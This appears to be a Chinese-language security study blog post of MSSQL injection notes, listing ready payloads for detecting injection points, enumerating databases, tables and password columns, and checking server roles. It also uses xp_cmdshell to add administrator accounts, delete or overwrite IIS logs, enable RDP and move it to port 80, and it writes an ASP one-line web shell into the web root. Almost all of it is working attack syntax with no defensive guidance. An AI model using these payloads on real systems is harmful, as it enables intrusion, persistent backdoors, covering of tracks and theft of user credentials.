---
layout:     post
title:      Web笔记（三）SQL注入之Mssql
subtitle:   这个系列是整理学习安全的笔记，包括Web和PWN的一些知识。本章是Mssql的SQL注入。
date:       2020-11-29
author:     K4ys0n
header-img: img/post-bg-rwd.jpg
catalog:    true
tags:
    - CTF
    - web
    - 网络安全
    - 学习笔记
    - SQL注入
    - Mssql
---



## 0x00 Mssql简介

Mssql，又称SQL Server，全称为Microsoft SQL Server，是美国Microsoft公司推出的一种关系型数据库系统，是一个可扩展的、高性能的、为分布式客户机/服务器计算所设计的数据库管理系统，实现了与WindowsNT的有机结合，提供了基于事务的企业级信息管理系统方案。

主要特点如下：

- 高性能设计，可充分利用WindowsNT的优势。
- 系统管理先进，支持Windows图形化管理工具，支持本地和远程的系统管理和配置。
- 强壮的事务处理功能，采用各种方法保证数据的完整性。
- 支持对称多处理器结构、存储过程、ODBC，并具有自主的SQL语言。Mssql以其内置的数据复制功能、强大的管理工具、与Internet的紧密集成和开放的系统结构为广大的用户、开发人员和系统集成商提供了一个出众的数据库平台。



## 0x01 Mssql常用场景

- 学校
- 政府
- OA
- 棋牌游戏
- 人事考试网站

asp/aspx+sqlserver



## 0x02 Mssql知识

#### 1.Mssql服务、端口、后缀

- 重启服务，使其生效。

- 命令：services.msc

  TCP  0.0.0.0:1433  0.0.0.0:0  LISTENING

- 1433端口是开启的，当我们关闭服务后，端口也将关闭。

- 后缀是xxx.mdf

- 日志文件后缀是xxx_log.ldf

- 数据库服务器系统级权限账号sa

#### 2. 数据库权限

- sa权限：数据库操作，文件管理，命令执行，注册表读取等system

- db权限：文件管理，数据库操作等users-administrators

- public权限：数据库操作guest-users



## 0x03 调用数据库代码

```asp
<%
set conn = server.createobject("adodb.connection")
conn.open "provider=sqloledb;source=local;uid=sa;pwd=*****;database=database-name"
%>
```
其中，provider后面的不用管，照写；source后面的是IP地址，这里是本地；sa是内置的用户，密码是在安装时设置的；database后面的是要连接的数据库名称，如：mydatabase（不需要扩展名）

一般这段代码会在以下文件中存在：

- conn.asp

- dbconfig.asp

如果是aspx则可能在：

- web.config



## 0x04 未知权限时注入语句

#### 1. 判断是否有注入

```
id=1 and 1=1 ;--
id=1 and 1=2 ;--
id=1/ 或者 id=1\
id=1-0
```

#### 2. 初步判断是否是mssql

```
id=1 and user>0 ;--		# 如果正常就是Mssql
```

#### 3. 判断数据库系统

```
id=1 and (select count(*) from sysobjects)>0 ;--		mssql
id=1 and (select count(*) from msysobjects)>0 ;--		access
```

如果上述语句正常，则可能是sa权限

#### 4. 注入参数是字符

```
id=1'and [查询条件] and '' = '
```

#### 5. 搜索没过滤参数的

```
id=1'and [查询条件] and '%25'='
```

#### 6. 猜数表名

```
id=1 and (select count(*) from [表名])>0 ;--
```

#### 7. 猜字段

```
id=1 and (select count([字段名]) from [表名])>0 ;--
```

#### 8. 猜字段中记录长度

```
id=1 and (select top 1 len([字段名]) from [表名])>0 ;--
```

#### 9. 猜字段的ascii值

```
id=1 and (select top 1 asc(mid([字段名], 1, 1)) from [表名])>0 ;--				access
id=1 and (select top 1 unicode(substring([字段名], 1, 1)) from [表名])>0 ;--				mssql
```

#### 10. 测试权限结构

```
id=1 and 1=(select IS_SRVROLEMEMBER('sysadmin'));--
id=1 and 1=(select IS_SRVROLEMEMBER('serveradmin'));--
id=1 and 1=(select IS_SRVROLEMEMBER('setupadmin'));--
id=1 and 1=(select IS_SRVROLEMEMBER('securityadmin'));--
id=1 and 1=(select IS_SRVROLEMEMBER('diskadmin'));--
id=1 and 1=(select IS_SRVROLEMEMBER('bulkadmin'));--
id=1 and 1=(select IS_SRVROLEMEMBER('db_owner'));--
```

#### 11. 添加mssql和系统的账户

```
id=1;exec master.dbo.sp_addlogin [用户名];--
id=1;exec master.dbo.sp_password null,[用户名],[密码];--
id=1;exec master.dbo.sp_addsrvrolemember sysadmin [用户名];--
id=1;exec master.dbo.xp_cmdshell 'net user [用户名] [密码] /workstations:* /times:all /passwordchg:yes /passwordreq:yes /active:yes /add';--
id=1;exec master.dbo.xp_cmdshell 'net user [用户名] [密码] /add';--
id=1;exec master.dbo.xp_cmdshell 'net localgroup administrators [用户名] /add';--
```



## 0x05 sa权限下SQL注入

#### 1. 获取数据库

```
# 数据库版本（利用类型不匹配报错）
id=1 and 1=(select @@version)
id=@@version
# 数据库名称（利用类型不匹配报错）
id=1 and 1=(select db_name())
id=db_name()
```

#### 2. 获取用户数据库

```
# 获取第一个用户数据库（mssql有4个自带的数据库，用户创建从5开始，所以是dbid>4）
id=1 and 1=(select top 1 name from master..sysdatabases where dbid>4)
id=1 and 1=(select top 1 name from master..sysdatabases where dbid>4 and name<>'[表名]')
id=1 and 1=(select top 1 name from master..sysdatabases where dbid>4 and name<>'[表名1]' and name<>'[表名2]')
以此类推可以获取全部用户数据库名

# 或者一次全部导出所有数据库名为xml字符串
id=1 and 1=(select name from master..sysdatabases for xml path)
```

#### 3. 获取表名

```
# 获取第一张表
id=1 and 1=(select top 1 name from sysobjects where xtype='u')
id=1 and 1=(select top 1 name from sysobjects where xtype='u' and name<>'[表名]')
id=1 and 1=(select top 1 name from sysobjects where xtype='u' and name<>'[表名1]' and name<>'[表名2]')
以此类推可以获取全部表名

# 或者一次全部导出所有表名为xml字符串
id=1 and 1=(select name from master..sysobjects for xml path)
```

#### 4. 获取表users的列名

```
# 获取第一列列名
id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name='users'))
id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name='users') and name<>'[列名]')
以此类推

id=1 and 1=(select top 1 name from syscolumns where id=(select id from sysobjects where name='[表名]') and name<>'[列名]')
```

#### 5. 获取表users的数据

```
# 获取第一个用户名对应的密码
id=1 and 1=(select top 1 [列名] from [表名])
id=1 and 1=(select top 1 [列名] from [表名] where [列名]<>'[具体数据]')
以此类推

# 示例
id=1 and 1=(select top 1 upass from users)
id=1 and 1=(select top 1 upass from users where upass<>'123456')
```

#### 6. 用户权限分析

基本信息搜集注入点权限判断

```
# 判断是否是系统管理员
and 1=(select is_srvrolemember('sysadmin'))

# 判断是否是库权限
and 1=(select is_srvrolemember('db_owner'))

# 判断是否是public权限
and 1=(select is_srvrolemember('public'))

# 当前数据库名
and 1=convert(int,db_name())或1=(select db_name())

# 本地服务名
and 1=(select @@servername)

# 判断是否有库读取权限
and 1=(select HAS_DBACCESS('master'))
```



## 0x06 Mssql扩展存储注入攻击(xp_cmdshell)

#### 1. 检测与恢复扩展存储（提升至sa权限并可执行xp_cmdshell）

```
# 判断xp_cmdshell扩展存储是否存在
id=1 and 1=(select count(*) from master.dbo.sysobjects where xtype='x' AND name='xp_cmdshell')
# 判断xp_regread扩展存储过程是否存在
id=1 and 1=(select count(*) from master.dbo.sysobjects where name='xp_regread')
# 恢复xp_cmdshell（如果不能新建用户则先执行此条，如为sa权限则可以跳过此步骤）
id=1;exec sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell',1;RECONFIGURE;
# 如果恢复不了则需要指定xplog70.dll文件
id=1;exec sp_dropextendedproc xp_cmdshell,'xplog70.dll'

# 如果dll文件也被删除，那就需要先想办法上传xplog70.dll再执行上述操作。
```

#### 2. sa权限下利用xp_cmdshell扩展执行任意命令

```
# 查看C盘（直接在id=1后面加下面语句）
id=1;drop table black;create TABLE black(mulu varchar(7996) NULL,ID int NOT NULL IDENTITY(1,1))--;insert into black exec master..xp_cmdshell 'dir c:\'and 1=(select top 1 mulu from black where id=1)

# 新建用户（直接在id=1后面加下面语句）
id=1;exec master..xp_cmdshell 'net user test test /add';exec master..xp_cmdshell 'net localgroup administrators test /add'  	创建新用户test并添加到管理员组

# 添加和删除一个sa权限的用户test：（需要sa权限）
id=1;exec master.dbo.sp_addlogin test,[密码]  	创建sa权限的用户test
id=1;exec master.dbo.sp_addsrvrolemember test,sysadmin  	添加test到sa组里

# 停掉或激活某个服务：（需要sa权限）
id=1;exec master..xp_servicecontrol 'stop', 'schedule'  	schedule为服务名
id=1;exec master..xp_servicecontrol 'start', 'schedule'

# 暴网站目录（实际上有sa权限直接dir就可以了，不需要这么复杂）
id=1;create table labeng(lala nvarchar(255), id int)
id=1;DECLARE @result varchar(255) EXEC master.dbo.xp_regread 'HKEY_LOCAL_MACHINE','SYSTEM\ControlSet001\Services\W3SVC\Parameters\Virtual Roots','/',@result output insert into labeng(lala) values(@result);
id=1;and 1=(select top 1 lala from labeng) 
或者
id=1;and 1=(select count(*) from labeng where lala>1)

# 删除日志记录
id=1;exec master.dbo.xp_cmdshell 'del c:\winnt\system32\logfiles\w3svc5\ex070606.log >c:\temp.txt'

# 替换日志记录
id=1;exec master.dbo.xp_cmdshell 'copy c:\winnt\system32\logfiles\w3svc5\ex070404.log c:\winnt\system32\logfiles\w3svc5\ex070606.log >c:\temp.txt'

# 开启远程数据库
id=1;select * from OPENROWSET('SQLOLEDB', 'server=servername;uid=sa;pwd=apachy_123', 'select * from table')
或者
id=1;select * from OPENROWSET('SQLOLEDB', 'uid=sa;pwd=apachy_123;Network=DBMSSOCN;Address=202.100.100.1,1433;', 'select * from table')

# 打开3389
id=1;exec master..xp_cmdshell 'sc config termservice start=auto'
id=1;exec master..xp_cmdshell 'net start termservice'
id=1;exec master..xp_cmdshell 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0x0 /f'        允许外部连接

# 改3389端口为80（80十六进制为0x50）
id=1;exec master..xp_cmdshell 'reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber /t REG_DWORD /d 0x50 /f'
```



## 0x07 sp_makewebtask写一句话木马

利用sp_makewebtask写入一句话木马。

```
id=1;exec sp_makewebtask 'c:\inetpub\wwwroot\x.asp','select''%3C%25%65%76%61%6C%20%72%65%71%75%65%73%74%28%22%63%68%6F%70%70%65%72%22%29%25%3E'''-- 

# 如果失败，可以尝试先执行下面语句
id=1;exec sp_configure 'Web Assistant Procedures', 1; RECONFIGURE
```

修改管理员密码：

```
id=1;update admin set password=123123 where username='admin';
```



## 0x08 dbowner权限下的扩展攻击利用

#### 1. 判断数据库用户权限

```
id=1 and 1=(select is_member('db_owner'));-- 
```

#### 2. 搜索web目录

```
id=1;create table temp(dir nvarchar(255),depth varchar(255),files varchar(255),ID int NOT NULL IDENTITY(1,1));--

然后
id=1;insert into temp(dir,depth,files)exec master.dbo.xp_dirtree 'c:', 1,1;--
id=1 and(select dir from temp where id=1)>0
```

由于不能一次性获取所有目录文件和文件夹名，因此需要更改id的值，依次列出文件和文件夹。

#### 3. 写入一句话木马

找到web目录后，就可以写入一句话木马了。

```
id=1;alter database ssdown5 set RECOVERY FULL;create table test(str image);--
id=1;backup log ssdown5 to disk='c:\test' with init;--
id=1;insert into test(str) values ('<%execute(request("cmd"))%>');--
id=1;backup log ssdown5 to disk='c:\inetpub\wwwroot\x.asp';--
id=1;alter database ssdown5 set RECOVERY simple;--
```



## 0x09 工具使用

- 穿山甲（pangolin）
- 萝卜头
- sqlmap